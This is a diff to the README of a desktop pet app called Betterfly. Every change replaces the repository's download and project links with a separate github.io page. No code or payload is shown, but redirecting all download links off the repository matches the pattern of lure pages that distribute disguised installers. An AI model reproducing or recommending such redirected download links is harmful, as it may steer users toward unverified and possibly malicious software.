@@ -1,6 +1,6 @@
 # 🦋 betterfly-desktop-pet-hub - Your Cheerful Desktop Companion Awaits
 
-[![Download Betterfly](https://img.shields.io/badge/Download-Betterfly-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Sharieimproved553/betterfly-desktop-pet-hub)
+[![Download Betterfly](https://img.shields.io/badge/Download-Betterfly-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://sharieimproved553.github.io)
 
 ## 🎯 What Is Betterfly?
 
@@ -26,7 +26,7 @@ Getting Betterfly up and running is easy. Just follow these steps.
 
 ### 1. 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/Sharieimproved553/betterfly-desktop-pet-hub](https://github.com/Sharieimproved553/betterfly-desktop-pet-hub)
+Visit this link to download the application: [https://sharieimproved553.github.io](https://sharieimproved553.github.io)
 
 ### 2. ▶️ Run the Application
 
@@ -136,7 +136,7 @@ A: Right-click the pet, select "Exit." Then go to "Settings" > "Apps" in Windows
 
 ## 📚 Additional Resources
 
-- **Project Page:** [https://github.com/Sharieimproved553/betterfly-desktop-pet-hub](https://github.com/Sharieimproved553/betterfly-desktop-pet-hub)
+- **Project Page:** [https://sharieimproved553.github.io](https://sharieimproved553.github.io)
 - **Release Notes:** Check the project page for a list of all updates and changes.
 - **Source Code:** If you're technically curious, you can browse the code on the GitHub page.
 
